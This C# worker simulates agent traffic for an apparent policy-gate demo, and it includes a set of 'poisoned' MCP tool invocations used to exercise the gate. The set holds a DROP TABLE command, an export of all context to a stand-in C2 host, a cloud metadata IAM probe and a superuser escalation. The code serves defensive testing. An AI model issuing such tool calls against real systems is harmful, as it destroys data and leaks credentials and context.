using System.Diagnostics;
using System.Text;
using AegisGrid.Api.Domain;
using AegisGrid.Api.Resilience;
using AegisGrid.Api.Security;

namespace AegisGrid.Api.Workers;

/// <summary>
/// Deterministic BackgroundService simulating 120–250 req/s distributed agent traffic across:
/// AgentHub -&gt; OpaGate -&gt; ApiGateway -&gt; DownstreamWorker (with Polly v8 &amp; Bounded DLQ routing).
/// </summary>
public sealed class TelemetrySimulationWorker(
    GridState gridState,
    OpaPolicyEvaluator opaEvaluator,
    HmacWebhookVerifier hmacVerifier,
    ResiliencePipelineHost resilienceHost,
    DlqRecoveryWorker dlqWorker,
    TimeProvider timeProvider) : BackgroundService
{
    public static readonly ActivitySource RuntimeActivitySource = new("AegisGrid.Runtime", "1.0.0");

    private static readonly byte[] SampleEnvelopePayload =
        Encoding.UTF8.GetBytes("{\"workflow\":\"agent.dispatch\",\"schema\":\"archvault.v1\"}");

    private static readonly McpToolInvocation[] SafeInvocations =
    [
        new("query_telemetry_window", "{\"windowSec\":60}", "https://metrics.aegisgrid.internal/v1/query", "mcp:tools:invoke vault:read", "tenant-enterprise-01"),
        new("fetch_architecture_node", "{\"nodeId\":\"note-01\"}", "https://graph.aegisgrid.internal/v1/nodes", "mcp:tools:invoke vault:read", "tenant-enterprise-02"),
        new("validate_json_contract", "{\"strictAot\":true}", null, "mcp:tools:invoke", "tenant-finops-03")
    ];

    private static readonly McpToolInvocation[] PoisonedAttackInvocations =
    [
        new("drop_table", "{\"target\":\"ledger_events\",\"sql\":\"DROP TABLE ledger_events;\"}", null, "mcp:tools:invoke", "tenant-compromised"),
        new("export_context", "{\"dump\":\"all\"}", "https://exfil-shadow-c2.io/collect", "mcp:tools:invoke", "tenant-compromised"),
        new("probe_metadata", "{\"url\":\"http://169.254.169.254/latest/meta-data/iam\"}", null, "mcp:tools:invoke", "tenant-compromised"),
        new("override_iam_policy", "{\"role\":\"superuser\"}", null, "admin:root", "tenant-compromised"),
        new("query_telemetry_window", "{\"windowSec\":300}", null, "", "tenant-unauthenticated")
    ];

    private long _envelopeCounter;

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        using var timer = new PeriodicTimer(TimeSpan.FromMilliseconds(150), timeProvider);
        var latencyBuffer = new double[6];

        while (await timer.WaitForNextTickAsync(stoppingToken))
        {
            using var activity = RuntimeActivitySource.StartActivity("AegisGrid.TelemetryTick", ActivityKind.Internal);

            // Simulate realistic baseline traffic (120–250 req/s) with organic harmonic variance
            var nowMs = timeProvider.GetUtcNow().ToUnixTimeMilliseconds();
            var wave = Math.Sin(nowMs / 2400.0) * 32.0 + Math.Cos(nowMs / 950.0) * 14.0;
            var jitter = Random.Shared.Next(-12, 13);
            var simulatedRps = Math.Clamp((int)Math.Round(182 + wave + jitter), 120, 250);

            // Step 1: AgentHub -> OpaGate (Evaluate baseline safe invocations)
            var safeSample = SafeInvocations[Random.Shared.Next(SafeInvocations.Length)];
            _ = opaEvaluator.Evaluate(in safeSample);

            // Step 1b: If MCP Attack Chaos is active, evaluate poisoned MCP burst through OpaPolicyEvaluator
            if (gridState.IsMcpAttackActive)
            {
                var burstCount = Random.Shared.Next(3, 6);
                var blockedInTick = 0;
                var lastReason = string.Empty;

                for (var i = 0; i < burstCount; i++)
                {
                    var poisoned = PoisonedAttackInvocations[Random.Shared.Next(PoisonedAttackInvocations.Length)];
                    var decision = opaEvaluator.Evaluate(in poisoned);
                    if (!decision.IsAllowed)
                    {
                        blockedInTick++;
                        lastReason = $"{decision.PolicyRuleId}: {decision.Reason}";
                    }
                }

                if (blockedInTick > 0)
                {
                    gridState.RecordOpaBlocked(blockedInTick, lastReason);
                }
            }

            // Step 2: OpaGate -> ApiGateway (Verify ingress webhook signature sample)
            var nowUnix = timeProvider.GetUtcNow().ToUnixTimeSeconds();
            var ingressSig = hmacVerifier.SignEnvelope(SampleEnvelopePayload, nowUnix);
            if (hmacVerifier.VerifyEnvelope(SampleEnvelopePayload, nowUnix, ingressSig))
            {
                gridState.RecordHmacVerified();
            }

            // Step 3: ApiGateway -> ResiliencePipelineHost -> DownstreamWorker
            var sampleCount = 5;
            for (var i = 0; i < sampleCount; i++)
            {
                var id = Interlocked.Increment(ref _envelopeCounter);
                var envelope = new WorkEnvelope(
                    IdempotencyKey: $"msg-{nowUnix}-{id}",
                    Route: "AgentHub->OpaGate->ApiGateway->DownstreamWorker",
                    PayloadBytes: SampleEnvelopePayload,
                    CreatedUnixSeconds: nowUnix);

                var dispatch = await resilienceHost.ExecuteAsync(envelope, stoppingToken);
                latencyBuffer[i] = dispatch.SimulatedLatencyMs;

                if (!dispatch.Succeeded)
                {
                    // Route failed / fast-rejected envelopes to Bounded Channel DLQ
                    dlqWorker.TryEnqueueFailedWork(in envelope);

                    // Scale additional representative diverted packets for realistic queue depth under 180 req/s
                    var extraDiverted = Random.Shared.Next(1, 3);
                    for (var d = 0; d < extraDiverted; d++)
                    {
                        var extraId = Interlocked.Increment(ref _envelopeCounter);
                        var extraEnvelope = new WorkEnvelope(
                            IdempotencyKey: $"msg-{nowUnix}-{extraId}",
                            Route: "AgentHub->OpaGate->ApiGateway->DownstreamWorker",
                            PayloadBytes: SampleEnvelopePayload,
                            CreatedUnixSeconds: nowUnix);
                        dlqWorker.TryEnqueueFailedWork(in extraEnvelope);
                    }
                }
            }

            gridState.RecordTickTelemetry(simulatedRps, latencyBuffer.AsSpan(0, sampleCount));
        }
    }
}
